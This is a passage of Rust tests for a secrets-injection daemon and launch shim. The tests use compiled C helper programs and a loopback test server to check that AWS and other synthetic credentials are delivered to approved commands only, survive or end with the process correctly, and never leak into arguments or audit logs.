            legacy_unlock_req(&reg.name, UnlockAction::Run, true)] {
            let err = f.send(req).unwrap_err();
            assert!(err.to_string().contains(SCOPED_LEGACY_REFUSAL), "{err}");
            assert!(f.st.lock().unwrap().aws.is_empty());
            assert_eq!(f.st.lock().unwrap().leases[&reg.name].uses, 0);
        }
        for action in ["daemon-aws-open", "daemon-sso-open", "daemon-unlock"] {
            assert!(f.records().iter().any(|r| r["action"] == action && r["ok"] == false && r["err"].as_str().is_some_and(|e| e.contains(SCOPED_LEGACY_REFUSAL))));
        }
        // Expired/nonmatching leases do not impose a new endpoint restriction.
        f.st.lock().unwrap().leases.get_mut(&reg.name).unwrap().info.to = Grantee::Kind("other".into());
        assert!(f.send(Req::AwsOpen { profile: "static".into(), creds: "synthetic".into(), ttl: 60 }).is_ok());
        { let mut g = f.st.lock().unwrap(); let h = g.leases.get_mut(&reg.name).unwrap(); h.info.to = Grantee::Any; h.info.expires = now(); }
        assert!(f.send(Req::AwsOpen { profile: "static".into(), creds: "synthetic".into(), ttl: 60 }).is_ok());
    }

    #[test]
    fn legacy_scoped_nested_sso_and_independent_endpoints() {
        let (mut f, reg) = legacy_sso_fixture();
        // Stored envelope permits unwrap, but registration remains private: this
        // reaches the nested SsoOpen defense rather than stopping at primary Use.
        let v = peer_vault(&f.p, &f.peer).unwrap();
        let dek = f.st.lock().unwrap().leases[&reg.name].dek.clone();
        let file = v.build_file(&reg.name, store::Tier::Open, true, false, &dek, &crate::sso::entry_json(&reg.profile).unwrap(), &v.pubkeys_local().unwrap(), None).unwrap();
        store::save_secret(&f.p, &file).unwrap();
        legacy_software_proof(&f);
        let err = f.send(legacy_unlock_req(&reg.name, UnlockAction::Run, true)).unwrap_err();
        assert!(err.to_string().contains(SCOPED_LEGACY_REFUSAL));
        assert!(f.st.lock().unwrap().aws.is_empty());
        assert_eq!(f.st.lock().unwrap().leases[&reg.name].uses, 0);
        for action in ["daemon-sso-open", "daemon-unlock"] {
            assert!(f.records().iter().any(|r| r["action"] == action && r["ok"] == false && r["err"].as_str().is_some_and(|e| e.contains(SCOPED_LEGACY_REFUSAL))));
        }
        let audit = std::fs::read_to_string(f.p.audit()).unwrap();
        assert!(!audit.contains(&B64.encode(dek.as_ref())));
        assert!(!audit.contains("synthetic-secret-canary"));
        // Independent policy and human callers retain their old endpoint path.
        assert!(f.send(Req::AwsOpen { profile: "static".into(), creds: "synthetic".into(), ttl: 60 }).is_ok());
        f.st.lock().unwrap().sso_profiles.get_mut(&reg.name).unwrap().agent_allowed = true;
        assert!(f.send(Req::SsoOpen { name: reg.name.clone(), dek: None, ttl: 60 }).is_ok());
        f.peer = agent::Peer::default();
        f.st.lock().unwrap().sso_profiles.get_mut(&reg.name).unwrap().agent_allowed = false;
        legacy_software_proof(&f);
        assert!(f.send(legacy_unlock_req(&reg.name, UnlockAction::Run, true)).is_ok());
        assert!(f.send(Req::AwsOpen { profile: "static".into(), creds: "synthetic".into(), ttl: 60 }).is_ok());
    }

    #[test]
    fn production_shim_child() {
        // Ordinary suite invocation has no fd 3 socket. The exact re-exec below
        // receives only that descriptor, and an entirely empty environment.
        if std::env::args().any(|a| a == "--exact") {
            assert!(std::env::vars_os().next().is_none(), "shim inherited environment");
            // Isolated reexec: regress the second (target) sweep above a lowered
            // soft limit, not merely the owner-to-shim descriptor sweep.
            unsafe {
                let mut limit: libc::rlimit = std::mem::zeroed();
                assert_eq!(libc::getrlimit(libc::RLIMIT_NOFILE, &mut limit), 0);
                limit.rlim_cur = limit.rlim_max.min(4096);
                assert_eq!(libc::setrlimit(libc::RLIMIT_NOFILE, &limit), 0);
                let fd = libc::open(c"/dev/null".as_ptr(), libc::O_RDONLY);
                assert!(fd >= 0); assert_eq!(libc::dup2(fd, 917), 917); libc::close(fd);
                limit.rlim_cur = 128;
                assert_eq!(libc::setrlimit(libc::RLIMIT_NOFILE, &limit), 0);
            }
            if crate::shim::launch_shim_main().is_err() { std::process::exit(1); }
        }
    }

    #[test]
    fn production_shim_native_aws_lifetime() {
        use std::os::unix::process::ExitStatusExt;
        let mut modes = vec!["exit", "override", "unset", "term", "int", "hup", "quit", "changed", "noexec", "kill", "disconnect", "cli", "filter", "reap"];
        if cfg!(debug_assertions) { modes.extend(["sso", "sso-override"]); }
        for mode in modes {
            let mut creds = static_test_creds();
            if mode == "unset" { creds.region = None; }
            #[cfg(debug_assertions)]
            let (f, mut req) = if mode.starts_with("sso") { sso_fixture("agent") } else { aws_fixture(&creds.to_json().unwrap()) };
            #[cfg(not(debug_assertions))]
            let (f, mut req) = aws_fixture(&creds.to_json().unwrap());
            let target = f.p.root.join("native-aws");
            let output = f.p.root.join("output");
            let release = f.p.root.join("release");
            let source = f.p.root.join("native.c");
            std::fs::write(&source, r#"#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
extern char **environ;
int main(int argc, char **argv) {
 (void)argc;
 for (int i=3;i<1024;i++) if (fcntl(i,F_GETFD)!=-1) return 94;
 const char *url=getenv("AWS_CONTAINER_CREDENTIALS_FULL_URI"), *token=getenv("AWS_CONTAINER_AUTHORIZATION_TOKEN");
 if (!url || !token) return 95;
 int port=0; char path[512]; if(sscanf(url,"http://127.0.0.1:%d/%511s",&port,path)!=2) return 96;
 int fd=socket(AF_INET,SOCK_STREAM,0); struct sockaddr_in a={0}; a.sin_family=AF_INET; a.sin_port=htons(port); inet_pton(AF_INET,"127.0.0.1",&a.sin_addr);
 if(connect(fd,(struct sockaddr*)&a,sizeof(a))) return 97;
 char request[2048]; int n=snprintf(request,sizeof(request),"GET /%s HTTP/1.1\r\nHost: localhost\r\nAuthorization: %s\r\n\r\n",path,token);
 if(write(fd,request,n)!=n) return 98;
 char response[8192]; size_t used=0; ssize_t got;
 while((got=read(fd,response+used,sizeof(response)-used-1))>0) used+=got;
 close(fd); response[used]=0;
 if(strncmp(response,"HTTP/1.1 200",12)) return 99;
 uint64_t hash=14695981039346656037ULL;
 for(size_t i=0;i<used;i++) { hash^=(unsigned char)response[i]; hash*=1099511628211ULL; }
 FILE *f=fopen(argv[1],"w"); if(!f) return 100;
 fprintf(f,"%d\n%llu\n",getpid(),(unsigned long long)hash);
 const char *keys[]={"\"AccessKeyId\"", "\"SecretAccessKey\"", "\"Token\""};
 hash=14695981039346656037ULL;
 for(int i=0;i<3;i++) {
   char *v=strstr(response,keys[i]); if(!v) return 103;
   v=strchr(v,':'); if(!v) return 104;
   v=strchr(v,'"'); if(!v) return 105;
   for(v++;*v && *v!='"';v++) { hash^=(unsigned char)*v; hash*=1099511628211ULL; }
   hash^='\n'; hash*=1099511628211ULL;
 }
 fprintf(f,"%llu\n",(unsigned long long)hash);
 for(char **e=environ;*e;e++) { const char *eq=strchr(*e,'='); fprintf(f,"%.*s\n",(int)(eq-*e),*e); }
 fprintf(f,"region:%s\ndefault:%s\nconfig:%s\nshared:%s\nload:%s\ninjected:%s\n",getenv("AWS_REGION")?:"UNSET",getenv("AWS_DEFAULT_REGION")?:"UNSET",getenv("AWS_CONFIG_FILE"),getenv("AWS_SHARED_CREDENTIALS_FILE"),getenv("AWS_SDK_LOAD_CONFIG"),getenv("KARAMBIT_INJECTED"));
 fprintf(f,"canary:%s\n",getenv("APPROVED_CANARY")?:"UNSET");
 fclose(f);
 for(int i=0;access(argv[2],F_OK) && i<6000;i++) usleep(10000);
 if(!strcmp(argv[3],"disconnect") || !strcmp(argv[3],"kill")) {
   fd=socket(AF_INET,SOCK_STREAM,0);
   if(connect(fd,(struct sockaddr*)&a,sizeof(a)) || write(fd,request,n)!=n) return 101;
   used=0; while((got=read(fd,response+used,sizeof(response)-used-1))>0) used+=got;
   close(fd); response[used]=0;
   if(strncmp(response,"HTTP/1.1 404",12)) return 102;
 }
 f=fopen(argv[1],"a"); fputs("finished\n",f); fclose(f);
 return 23;
}
"#).unwrap();
            assert!(std::process::Command::new("cc").arg(&source).arg("-o").arg(&target).status().unwrap().success());
            if mode == "noexec" { std::fs::write(&target, b"not an executable image\n").unwrap(); }
            f.st.lock().unwrap().leases.get_mut("aws/static").unwrap().scope.cmds = vec![CommandBinding::from(target.to_str().unwrap()).pin().unwrap()];
            if let Req::LaunchPrepare { argv, target: requested_target, .. } = &mut req { *requested_target = target.clone(); *argv = vec![target.to_str().unwrap().into(), output.to_str().unwrap().into(), release.to_str().unwrap().into(), mode.into()]; }
            if mode == "filter" {
                // Approved map carries conflicting reserved AWS names (all backed by a
                // separate synthetic secret) plus an unrelated canary that must survive.
                let v = peer_vault(&f.p, &f.peer).unwrap();
                let dek = crate::crypto::new_dek();
                let file = v.build_file("test/conflict", store::Tier::Bio, false, false, &dek, b"synthetic-conflict-canary", &v.pubkeys_local().unwrap(), None).unwrap();
                store::save_secret(&f.p, &file).unwrap();
                let mut held = Held { info: f.st.lock().unwrap().leases["aws/static"].info.clone(), dek, root: None, uses: 0,
                    scope: Scope { cmds: vec![CommandBinding::from(target.to_str().unwrap()).pin().unwrap()], ..Default::default() } };
                held.info.name = "test/conflict".into();
                f.st.lock().unwrap().leases.insert("test/conflict".into(), held);
                if let Req::LaunchPrepare { env, refs, .. } = &mut req {
                    for k in ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN", "AWS_PROFILE", "AWS_REGION",
                        "AWS_CONTAINER_CREDENTIALS_FULL_URI", "AWS_CONTAINER_AUTHORIZATION_TOKEN", "AWS_CONFIG_FILE", "AWS_SDK_LOAD_CONFIG", "KARAMBIT_INJECTED", "APPROVED_CANARY"] {
                        env.insert(k.into(), "test/conflict".into());
                    }
                    refs.push("test/conflict".into());
                }
            }
            if mode == "reap" { store::ensure_dir(&run_dir(&f.p)).unwrap(); std::fs::write(run_dir(&f.p).join("reap-probe-enable"), b"").unwrap(); }
            let prepared = f.send(req).unwrap();
            assert_eq!(prepared.as_object().unwrap().len(), 2);
            let http = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
            let port = http.local_addr().unwrap().port();
            http.set_nonblocking(true).unwrap();
            let (p, st) = (f.p.clone(), f.st.clone());
            let (stop, stopped) = std::sync::mpsc::channel();
            let http_thread = std::thread::spawn(move || {
                while stopped.try_recv().is_err() {
                    match http.accept() {
                        Ok((c, _)) => { c.set_nonblocking(false).unwrap(); serve_aws(c, &st, &p).unwrap(); }
                        Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => std::thread::sleep(Duration::from_millis(5)),
                        Err(e) => panic!("{e}"),
                    }
                }
            });
            store::ensure_dir(&run_dir(&f.p)).unwrap();
            let socket = sock_path(&f.p);
            let listener = UnixListener::bind(&socket).unwrap();
            let (p, st, base) = (f.p.clone(), f.st.clone(), f.sso_base.clone());
            let replacement = target.clone();
            let (connected, connection) = std::sync::mpsc::channel();
            let handler = std::thread::spawn(move || {
                let c = listener.accept().unwrap().0;
                let pid = peer_of(&c, unsafe { libc::getuid() }).unwrap();
                connected.send((pid, c.try_clone().unwrap())).unwrap();
                crate::sso::TEST_BASE.with(|b| *b.borrow_mut() = base);
                install_launch_unwrap(st.clone(), p.clone(), None);
                if mode == "changed" {
                    LAUNCH_BIND_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |stage| {
                        if stage == "redeem-write" { std::fs::OpenOptions::new().append(true).open(&replacement)?.write_all(b"changed")?; }
                        Ok(())
                    })));
                }
                serve_connection(p, st, c, unsafe { libc::getuid() }, port);
            });
            let mut command = if mode == "cli" {
                // Cargo-built client only; the daemon remains this test's
                // in-process handler. Never use PATH/installed karambit.
                assert!(std::process::Command::new(env!("CARGO")).args(["build", "-q", "-p", "karambit-cli"])
                    .current_dir(Path::new(env!("CARGO_MANIFEST_DIR")).join("../..")).status().unwrap().success());
                let target_dir = std::env::var_os("CARGO_TARGET_DIR").map(PathBuf::from)
                    .unwrap_or_else(|| Path::new(env!("CARGO_MANIFEST_DIR")).join("../../target"));
                let exe = std::fs::canonicalize(target_dir.join("debug/karambit")).unwrap();
                let pin = crate::platform::helper::sha256_file(&exe).unwrap();
                writeln!(std::fs::OpenOptions::new().append(true).open(f.p.keys().join("daemon.sha256")).unwrap(), "\n{pin}").unwrap();
                let mut command = std::process::Command::new(exe); command.arg("__launch").env("KARAMBIT_DEV", "1"); command
            } else {
                let mut command = std::process::Command::new(std::env::current_exe().unwrap());
                command.args(["--exact", "daemon::launch_prepare_tests::production_shim_child", "--nocapture"]); command
            };
            command.stdin(std::process::Stdio::null());
            let launch = std::thread::spawn(move || crate::shim::test_spawn_region(command, socket, &prepared, (mode.ends_with("override")).then(|| "eu-west-2".into())));
            let (pid, control) = connection.recv_timeout(WAIT).unwrap();
            // Drop this duplicate unless testing server-side shutdown: merely
            // retaining it would hide client EOF and invalidate lifecycle tests.
            if mode == "changed" || mode == "noexec" {
                drop(control);
                // Neither a refused exec (forked child reports errno) nor a pre-exec failure
                // may look like a program that ran and exited 127/1: the owner gets an error.
                let error = launch.join().unwrap().unwrap_err();
                let text = format!("{error:#}");
                assert!(text.contains("the program did not start"), "{mode}: {text}");
                if mode == "noexec" { assert!(text.contains("exec failed"), "{text}"); }
                handler.join().unwrap();
                assert!(!output.exists());
            } else {
                let until = Instant::now() + WAIT;
                let text = loop {
                    if let Ok(text) = std::fs::read_to_string(&output) && text.contains("injected:1\n") { break text; }
                    assert!(!launch.is_finished(), "target failed before ready: {mode}");
                    assert!(Instant::now() < until, "AWS target timeout: {mode}");
                    std::thread::sleep(Duration::from_millis(10));
                };
                let mut lines = text.lines();
                let target_pid: i32 = lines.next().unwrap().parse().unwrap();
                assert_ne!(lines.next().unwrap().parse::<u64>().unwrap(), 0);
                let served = if mode.starts_with("sso") {
                    crate::aws::AwsCreds { access_key_id: "ASIAFAKEFAKEFAKE".into(), secret_access_key: "fake".into(), session_token: Some("fake".into()), region: Some("us-east-1".into()), session_mint: false }
                } else { creds.clone() };
                let expected_hash = [&served.access_key_id, &served.secret_access_key, served.session_token.as_ref().unwrap()].iter()
                    .flat_map(|s| s.as_bytes().iter().copied().chain(std::iter::once(b'\n')))
                    .fold(14695981039346656037u64, |hash, b| (hash ^ u64::from(b)).wrapping_mul(1099511628211));
                assert_eq!(lines.next().unwrap().parse::<u64>().unwrap(), expected_hash);
                let mut names: Vec<_> = lines.take_while(|l| !l.starts_with("region:")).collect(); names.sort();
                let mut expected = vec!["AWS_CONFIG_FILE", "AWS_SHARED_CREDENTIALS_FILE", "AWS_SDK_LOAD_CONFIG", "AWS_CONTAINER_CREDENTIALS_FULL_URI", "AWS_CONTAINER_AUTHORIZATION_TOKEN", "KARAMBIT_INJECTED"];
                if mode != "unset" { expected.extend(["AWS_REGION", "AWS_DEFAULT_REGION"]); }
                if mode == "filter" {
                    expected.push("APPROVED_CANARY");
                    // Reserved approved values never reach the target; the canary does once.
                    assert_eq!(text.matches("synthetic-conflict-canary").count(), 1, "only APPROVED_CANARY carries the approved value");
                    assert!(text.contains("canary:synthetic-conflict-canary\n"));
                }
                expected.sort(); assert_eq!(names, expected);
                let region = if mode.ends_with("override") { "eu-west-2" } else if mode == "unset" { "UNSET" } else { "us-east-1" };
                assert!(text.contains(&format!("region:{region}\ndefault:{region}\n")));
                let empty = run_dir(&f.p).join("aws-empty");
                assert!(text.contains(&format!("config:{}\nshared:{}\nload:0\ninjected:1\n", empty.display(), empty.display())));
                assert!(std::fs::read(empty).unwrap().is_empty());
                assert_eq!(f.st.lock().unwrap().aws.len(), 1, "endpoint must survive exec");
                assert!(bound(&f));
                let args = std::process::Command::new("ps").args(["-p", &format!("{pid},{target_pid}"), "-o", "args="]).output().unwrap();
                let args = String::from_utf8(args.stdout).unwrap();
                let token = { f.st.lock().unwrap().aws.values().next().unwrap().token.clone() };
                assert!(!args.contains(token.as_str()));
                for (_, part) in creds.secret_parts() { assert!(!args.as_bytes().windows(part.len()).any(|w| w == part)); }
                let signal = match mode { "term" => Some(libc::SIGTERM), "int" => Some(libc::SIGINT), "hup" => Some(libc::SIGHUP), "quit" => Some(libc::SIGQUIT), "kill" => Some(libc::SIGKILL), _ => None };
                if mode == "disconnect" { control.shutdown(std::net::Shutdown::Both).unwrap(); }
                drop(control);
                if let Some(signal) = signal { assert_eq!(unsafe { libc::kill(pid, signal) }, 0); }
                if matches!(mode, "kill" | "disconnect") {
                    let until = Instant::now() + WAIT;
                    while !f.st.lock().unwrap().aws.is_empty() { assert!(Instant::now() < until); std::thread::sleep(Duration::from_millis(10)); }
                    assert_eq!(unsafe { libc::kill(target_pid, 0) }, 0, "orphan/dead-credentials child keeps running");
                }
                if signal.is_none() || mode == "kill" { std::fs::write(&release, b"").unwrap(); }
                let status = launch.join().unwrap().unwrap();
                if let Some(signal) = signal { assert_eq!(status.signal(), Some(signal), "{mode}"); }
                else { assert_eq!(status.code(), Some(23), "{mode}"); }
                handler.join().unwrap();
                if mode == "reap" {
                    let probe = std::fs::read_to_string(run_dir(&f.p).join("reap-probe")).unwrap();
                    assert_eq!(probe, "blocked:true\ncleared:true\nzombie:true\n", "forwarding must stop before reap");
                }
                if mode == "kill" {
                    let until = Instant::now() + WAIT;
                    while !std::fs::read_to_string(&output).unwrap().ends_with("finished\n") {
                        assert!(Instant::now() < until, "orphan did not finish with dead credentials");
                        std::thread::sleep(Duration::from_millis(10));
                    }
                }
            }
            stop.send(()).unwrap(); http_thread.join().unwrap();
            assert!(f.st.lock().unwrap().aws.is_empty(), "{mode}");
            assert!(!bound(&f), "{mode}");
        }
    }

    #[test]
    fn production_shim_native_env_and_status() {
        use std::os::unix::process::ExitStatusExt;
        for mode in ["ok", "signal", "changed", "killed", "enoexec", "go-wrong", "go-eof", "go-withheld", "shell-public", "shell-unscoped", "shell-human"] {
            let f = Fixture::redeem();
            let target = f.p.root.join("native");
            let source = f.p.root.join("native.c");
            let output = f.p.root.join("output");
            std::fs::write(&source, r#"#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
int main(int argc, char **argv) {
 if (getenv("HOME") || getenv("PATH")) return 91;
 if (!getenv("KARAMBIT_INJECTED") || strcmp(getenv("KARAMBIT_INJECTED"),"1")) return 94;
 const char *v = getenv("VALUE"); if (!v) return 92;
 FILE *f = fopen(argv[1], "w"); if (!f) return 93;
 fputs(v, f); fclose(f);
 if (argc > 2 && strcmp(argv[2], "signal") == 0) raise(SIGTERM);
 return 23;
}
"#).unwrap();
            assert!(std::process::Command::new("cc").arg(&source).arg("-o").arg(&target).status().unwrap().success());
            if mode == "enoexec" {
                std::fs::write(&target, format!("echo forbidden > {}; exit 23\n", output.display())).unwrap();
            }
            f.st.lock().unwrap().leases.get_mut("test/ref").unwrap().scope.cmds = vec![CommandBinding::from(target.to_str().unwrap()).pin().unwrap()];
            let mut f = f;
            let argv: Vec<String> = if mode.starts_with("shell-") {
                if mode == "shell-unscoped" {
                    f.st.lock().unwrap().leases.get_mut("test/ref").unwrap().scope.cmds.clear();
                } else {
                    f.policy(store::Tier::Open, false, true);
                }
                if mode == "shell-human" {
                    let mut cfg = store::Config::default();
                    cfg.agent_process_names.clear(); cfg.agent_env_markers.clear();
                    cfg.removed_defaults = store::DEFAULT_AGENT_PROCESS_NAMES.iter().chain(store::DEFAULT_AGENT_ENV_MARKERS).map(|s| (*s).into()).collect();
                    store::save_config(&f.p, &cfg).unwrap();
                    f.peer = agent::detect_peer(&cfg, f.peer.pid);
                    assert!(!f.peer.caller.is_agent());
                }
                vec!["/bin/sh".into(), "-c".into(), "printf %s \"$VALUE\" > \"$1\"; exit 23".into(), "sh".into(), output.to_str().unwrap().into()]
            } else {
                vec![target.to_str().unwrap().into(), output.to_str().unwrap().into(), mode.into()]
            };
            let req = Req::LaunchPrepare { allow_hosts: vec![], jail: false, refs: vec!["test/ref".into()], env: [("VALUE".into(), "test/ref".into())].into(), target: argv[0].clone().into(), argv, cwd: f.p.root.clone(), aws: None, ambient_bytes: 0, no_redact: false };
            let prepared = f.send(req).unwrap();
            assert_eq!(prepared.as_object().unwrap().len(), 2);
            match mode {
                "go-wrong" => std::fs::write(f.p.root.join("go-byte"), b"g").unwrap(),
                "go-eof" => std::fs::write(f.p.root.join("go-byte"), b"").unwrap(),
                // No GO is ever sent: the shim's GO wait ends only at the launch's own
                // expiry. Shortening that deadline here would race the shim's startup,
                // bind and redeem (hashing this test binary), which can take seconds
                // under load and would refuse the launch before it reaches the GO wait.
                "go-withheld" => std::fs::write(f.p.root.join("go-byte"), b"T").unwrap(),
                _ => (),
            }
            assert!(std::env::vars().all(|(_, v)| v.as_bytes() != test_value().as_slice()));
            let socket = f.p.root.join("production-shim.sock");
            let listener = UnixListener::bind(&socket).unwrap();
            let p = f.p.clone(); let st = f.st.clone();
            let replacement = target.clone();
            let handler = std::thread::spawn(move || {
                listener.set_nonblocking(true).unwrap();
                let until = Instant::now() + WAIT;
                let c = loop {
                    match listener.accept() {
                        Ok((c, _)) => break c,
                        Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                            assert!(Instant::now() < until, "shim did not connect");
                            std::thread::sleep(Duration::from_millis(10));
                        },
                        Err(e) => panic!("synthetic accept: {e}"),
                    }
                };
                c.set_nonblocking(false).unwrap();
                let shim_pid = peer_of(&c, unsafe { libc::getuid() }).unwrap();
                let args = std::process::Command::new("ps").args(["-p", &shim_pid.to_string(), "-o", "args="]).output().unwrap();
                let args = String::from_utf8(args.stdout).unwrap();
                assert!(args.contains("production_shim_child"));
                assert!(!args.contains("launch_redeem") && !args.contains("token"));
                assert!(!args.as_bytes().windows(test_value().len()).any(|w| w == test_value().as_slice()));
                install_launch_unwrap(st.clone(), p.clone(), None);
                if mode == "killed" {
                    LAUNCH_BIND_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |stage| {
                        if stage == "recheck" { unsafe { libc::kill(shim_pid, libc::SIGKILL); } }
                        Ok(())
                    })));
                }
                if mode == "changed" {
                    LAUNCH_BIND_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |stage| {
                        if stage == "redeem-write" {
                            std::fs::OpenOptions::new().append(true).open(&replacement)?.write_all(b"changed")?;
                        }
                        Ok(())
                    })));
                }
                serve_connection(p, st, c, unsafe { libc::getuid() }, 0);
            });
            let mut command = std::process::Command::new(std::env::current_exe().unwrap());
            command.args(["--exact", "daemon::launch_prepare_tests::production_shim_child", "--nocapture"]);
            let result = crate::shim::test_spawn(command, socket, &prepared);
            handler.join().unwrap();
            if mode == "killed" {
                assert!(result.is_err());
                assert!(!output.exists());
                assert!(f.st.lock().unwrap().aws.is_empty());
                assert!(!f.records().iter().any(|r| r["action"] == "launch-redeem"));
                continue;
            }
            if matches!(mode, "changed" | "enoexec" | "go-wrong" | "go-eof" | "go-withheld") {
                // The shim never ran the program: that is an error, not "exit 1".
                let text = format!("{:#}", result.as_ref().unwrap_err());
                assert!(text.contains("the program did not start"), "{mode}: {text}");
                if mode == "enoexec" { assert!(text.contains("exec failed"), "{text}"); }
            }
            if matches!(mode, "changed" | "enoexec") { assert!(!output.exists()); continue; }
            if matches!(mode, "go-wrong" | "go-eof" | "go-withheld") {
                assert!(!output.exists(), "target exec without exact GO: {mode}");
                assert!(!bound(&f), "{mode}");
                continue;
            }
            let status = result.unwrap();
            match mode {
                "ok" | "shell-public" | "shell-unscoped" | "shell-human" => assert_eq!(status.code(), Some(23)),
                "signal" => assert_eq!(status.signal(), Some(libc::SIGTERM)),
                "killed" => {
                    assert_eq!(status.signal(), Some(libc::SIGKILL));
                    assert!(!output.exists());
                    assert!(f.st.lock().unwrap().aws.is_empty());
                    assert!(!f.records().iter().any(|r| r["action"] == "launch-redeem"));
                    continue;
                },
                _ => unreachable!(),
            }
            assert_eq!(std::fs::read(output).unwrap(), test_value().as_slice());
        }
    }


    #[test]
    fn cli_replay_child() {
        let Ok(socket) = std::env::var("KARAMBIT_TEST_REPLAY_SOCKET") else { return; };
        let mut frame = Zeroizing::new(String::new());
        std::io::stdin().read_to_string(&mut frame).unwrap();
        for _ in 0..2 {
            let mut c = UnixStream::connect(&socket).unwrap();
            c.write_all(frame.as_bytes()).unwrap();
            c.shutdown(std::net::Shutdown::Write).unwrap();
            let mut response = String::new(); BufReader::new(c).read_line(&mut response).unwrap();
            assert_eq!(serde_json::from_str::<Value>(&response).unwrap(), json!({"error":"launch refused"}));
        }
    }

    #[test]
    fn production_cli_bound_run_contract() {
        use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
        use std::process::{Command, Stdio};
        assert!(Command::new(env!("CARGO")).args(["build", "-q", "-p", "karambit-cli"])
            .current_dir(Path::new(env!("CARGO_MANIFEST_DIR")).join("../..")).status().unwrap().success());
        let target_dir = std::env::var_os("CARGO_TARGET_DIR").map(PathBuf::from)
            .unwrap_or_else(|| Path::new(env!("CARGO_MANIFEST_DIR")).join("../../target"));
        let cli = std::fs::canonicalize(target_dir.join("debug/karambit")).unwrap();
        let cli_pin = crate::platform::helper::sha256_file(&cli).unwrap();
        let mut modes = vec!["smoke", "bare", "default", "file-order", "shell", "no-redact", "agent-no-redact",
            "static", "static-prefixed", "run-static", "aws-default", "default-var", "public", "sigterm", "no-secrets", "missing-profile", "missing-command",
            "renamed-shell", "replay", "changed", "failed-exec", "bound-refused", "installed", "schema", "schema-untrusted", "schema-node", "status-fd", "failed-exec-status", "too-large"];
        if cfg!(debug_assertions) { modes.extend(["sso", "run-sso", "sso-failed-exec", "invalid-env-sso"]); }
        for mode in modes {
            if std::env::var("KARAMBIT_TEST_CLI_CASE").is_ok_and(|only| only != mode) { continue; }
            eprintln!("production CLI case: {mode}");
            let aws = matches!(mode, "static" | "static-prefixed" | "run-static" | "aws-default" | "sso" | "run-sso" | "sso-failed-exec" | "invalid-env-sso" | "failed-exec");
            let sso = matches!(mode, "sso" | "run-sso" | "sso-failed-exec" | "invalid-env-sso");
            let creds = static_test_creds();
            let f = if sso {
                #[cfg(debug_assertions)] { sso_fixture("agent").0 }
                #[cfg(not(debug_assertions))] { unreachable!() }
            } else if aws { aws_fixture(&creds.to_json().unwrap()).0 } else { Fixture::redeem() };
            if aws { f.policy(store::Tier::Open, true, false); }
            if mode=="public" { f.policy(store::Tier::Open, false, true); }
            if mode=="too-large" { big_secret(&f, 1100 * 1024); }
            for key in ["bio.key", "open.key"] { std::fs::write(f.p.keys().join(key), b"synthetic init marker").unwrap(); }
            // The production CLI is the only extra executable trusted by this synthetic daemon.
            writeln!(std::fs::OpenOptions::new().append(true).open(f.p.keys().join("daemon.sha256")).unwrap(), "\n{cli_pin}").unwrap();
            if matches!(mode, "shell" | "no-redact") {
                let mut cfg = store::Config::default(); cfg.agent_process_names.clear(); cfg.agent_env_markers.clear();
                cfg.removed_defaults = store::DEFAULT_AGENT_PROCESS_NAMES.iter().chain(store::DEFAULT_AGENT_ENV_MARKERS).map(|s| (*s).into()).collect();
                store::save_config(&f.p, &cfg).unwrap();
                f.policy(store::Tier::Open, true, false);
            }
            let target = f.p.root.join("native-cli"); let source = f.p.root.join("native-cli.c");
            std::fs::write(&source, r#"#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
int main(int argc,char **argv) {
 if(argc!=2) return 61;
 if(strcmp(argv[1],"bare")==0 && strcmp(argv[0],"native-cli")) return 62;
 if(access("native-cli.c",F_OK)) return 63;
 if(!getenv("KARAMBIT_INJECTED") || strcmp(getenv("KARAMBIT_INJECTED"),"1")) return 64;
 if(getenv("AWS_ACCESS_KEY_ID") || getenv("AWS_SECRET_ACCESS_KEY") || getenv("AWS_SESSION_TOKEN")) return 65;
 FILE *mark=fopen("executed","w"); if(!mark)return 66; fputs("yes",mark); fclose(mark);
 if(!strcmp(argv[1],"schema")) {
   if(!getenv("PORT") || strcmp(getenv("PORT"),"3000")) return 75;
   if(!getenv("APP_URL") || strcmp(getenv("APP_URL"),"http://localhost:3000/api")) return 76;
   if(!getenv("FROM_SHELL") || strcmp(getenv("FROM_SHELL"),"shell-wins")) return 77;
   if(!getenv("QUOTED") || strcmp(getenv("QUOTED"),"a #b")) return 78;
   if(getenv("UNSET_OPTIONAL")) return 79;
   if(!getenv("MULTI") || strcmp(getenv("MULTI"),"line1\nline2")) return 80;
 }
 const char *v=getenv("X"); if(!v)v=getenv("TEST_REF"); if(v) { printf("%s\n",v); fprintf(stderr,"%s\n",v); }
 const char *url=getenv("AWS_CONTAINER_CREDENTIALS_FULL_URI");
 if(url) {
  const char *region=!strncmp(argv[1],"run-",4)?"us-east-1":"eu-west-2";
  if(!getenv("AWS_REGION") || strcmp(getenv("AWS_REGION"),region) || strcmp(getenv("AWS_DEFAULT_REGION"),region)) return 67;
  if(strcmp(getenv("AWS_SDK_LOAD_CONFIG"),"0")) return 68;
  for(int i=0;i<2;i++){ FILE *f=fopen(getenv(i?"AWS_CONFIG_FILE":"AWS_SHARED_CREDENTIALS_FILE"),"r"); if(!f || fgetc(f)!=EOF)return 69; fclose(f); }
  int port; char path[512]; if(sscanf(url,"http://127.0.0.1:%d/%511s",&port,path)!=2)return 70;
  int fd=socket(AF_INET,SOCK_STREAM,0); struct sockaddr_in a={0}; a.sin_family=AF_INET; a.sin_port=htons(port); inet_pton(AF_INET,"127.0.0.1",&a.sin_addr);
  if(connect(fd,(struct sockaddr*)&a,sizeof(a)))return 71;
  char req[2048]; int n=snprintf(req,sizeof(req),"GET /%s HTTP/1.1\r\nHost: localhost\r\nAuthorization: %s\r\n\r\n",path,getenv("AWS_CONTAINER_AUTHORIZATION_TOKEN"));
  if(write(fd,req,n)!=n)return 72;
